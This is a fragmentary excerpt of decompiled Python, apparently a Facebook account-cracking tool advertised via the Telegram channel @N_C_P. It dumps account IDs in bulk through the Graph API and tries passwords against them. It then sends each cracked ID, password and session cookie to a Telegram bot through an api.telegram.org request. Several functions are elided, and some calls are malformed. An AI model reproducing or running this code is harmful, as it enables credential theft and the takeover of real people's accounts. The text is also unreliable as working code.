...
def lo(word):
    ...
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write('{}{}'.format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()

lo('     𝙋𝙇𝙀𝘼𝙎𝙀 𝙒𝘼𝙄𝙏...')
webbrowser.open('https://t.me/N_C_P')
#webbrowser.open()
...
g = datetime.datetime(2025, 6, 1, 5, 35, 0)
...
if x.strftime('%x') == g.strftime('%x'):
    ...
    if x.strftime('%X') > g.strftime('%X'):
        print('')
        print('     ' + ' راسل المطور للتفعيل @N_C_P')
        print('')
        print(x)
        sys.exit(0)
    else:
...
S = '\033[1;33m'
print('')
token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ' + F)
print(('\033[92m—'*25)+'\n• DeCoDe By DEMO | @N_C_P •\n'+('—'*25))
ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m: ' + F)
os.system('clear')
pretty.install()
CON = sol()
...
try:
    ...
    print('[[1;91m![0m] tunggu sebentar sedang menginstall requests')
    os.system('pip install requests')

try:
    import rich
except:
    print('[[1;91m![0m] tunggu sebentar sedang menginstall rich')
    os.system('pip install rich')
...
def menu(my_name, my_id):
    ...
    banner()
    print()
    print('\x1b[1;33m» 𝐌𝐘 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⇒ @N_C_P     ')
    print()
    print(f'\x1b[2;36m» 𝐘𝐎𝐑 𝐈𝐏 -  : 192.168.0.1          ')
    print()
    print(a32 + '★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★')
    ...
    print(a32 + '★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★')
    print()
    _____alvino__adijaya_____ = input('[38;5;13m[+] Chose : ')
    ...
    with requests.Session() as ses:
        ...
        try:
            params = {
                ...
                'access_token': token }
            b = ses.get('https://graph.facebook.com/{}'.format(a), params, {
                'cookie': cok }, **('params', 'cookies')).json()
...
def dump_massal():
    try:
        ...
        exit()
    try:
        print('[28;4;408m[37m[93m[38;5;190m ' * 20)
        jum = int(input('  NUMBER  IDS : '))
        print('[28;4;408m[37m[93m[38;5;190m ' * 20)
    except ValueError:
...
def setting():
    wl = f''
    sol().print(mark(wl, 'green', style='bold'))
    ...
    if hu in ['1', '01']:
        ...
        ric = ''
        sol().print(mark(ric, 'yellow', style='bold'))
        exit()
    hc = '1'
    print('   ')
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    fff = '%'
    sys.stdout.write(f'\r{bo}[Dec_𝑫𝒂𝒓𝒘𝒊𝒏] - {loop}/{len(id2)} - [OK:{ok}] - [CP:{cp}] {int(pers)}{str(fff)}{x}')
    sys.stdout.flush()
        ...
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    ...
                    print('')
                    statuscp = f'DECODED BY DEMO | @N_C_P ▄︻デ══━一 𝑫𝒂𝒓𝒘𝒊𝒏 «𝗖𝗣  سڪيوࢪ  مع الاسف ❌💔» ⏎\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n\nOK\n𖣘) જ⁀➴  - 𝐈𝐃 : {idf}\n\n𖣘) જ⁀➴  - 𝗣𝗔𝗦𝗦 : {pw}\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n  لاتنسه اصور اصيد『@N_C_P』⏎\n\t\t\t\t\t'
                ...
                if 'no' in taplikasi:
                    ...
                    print('')
                    statusok = f'DECODED BY DEMO | @N_C_P\n                   ⪧ ❲ OK ❳\n √\n\n● 𝑫𝒂𝒓𝒘𝒊𝒏  \n ★- 𝐈𝐃 ➛ : {idf}\n\n\n\n● 𝑫𝒂𝒓𝒘𝒊𝒏\n ★ - 𝐏𝐀𝐒𝐒 ➛ \n :{pw}\n\n\n● 𝑫𝒂𝒓𝒘𝒊𝒏 \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}\n\nBy 𝑫𝒂𝒓𝒘𝒊𝒏 \n:『@N_C_P 』⏎\'\n\n\t\t\t\t\t\n\t\t\t\t\t'
                    ...
                    infoakun += f'DECODED BY DEMO | @N_C_P ▄︻デ══━一 𝑫𝒂𝒓𝒘𝒊𝒏 «𝗢𝗞 𝑫𝒂𝒓𝒘𝒊𝒏   جبلك حساب شغال 🤩⚜️\n » ⏎\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n\n (𖣘) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n\n(𖣘) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 : {pw}\n\n❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {kuki}\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n𝑫𝒂𝒓𝒘𝒊𝒏 :لاتنسه صور الصيد『@N_C_P』⏎'
                    ...
                    print('')
                    statusok = f'DECODED BY DEMO | @N_C_P \n ▄︻デ══━一 «𝗢𝗞  جابلك 𝑫𝒂𝒓𝒘𝒊𝒏 حساب شغال 🤩⚜️\n » ⏎\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n\n𖣘) જ⁀➴  - 𝐈𝐃 : {idf}\n\n𖣘) જ⁀➴  - 𝗣𝗔𝗦𝗦  : {pw}\n\n❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {kuki}\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\nلاتنسه اصور الصيد :『@N_C_P 』⏎'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                    cek_HAXOXX(kuki)
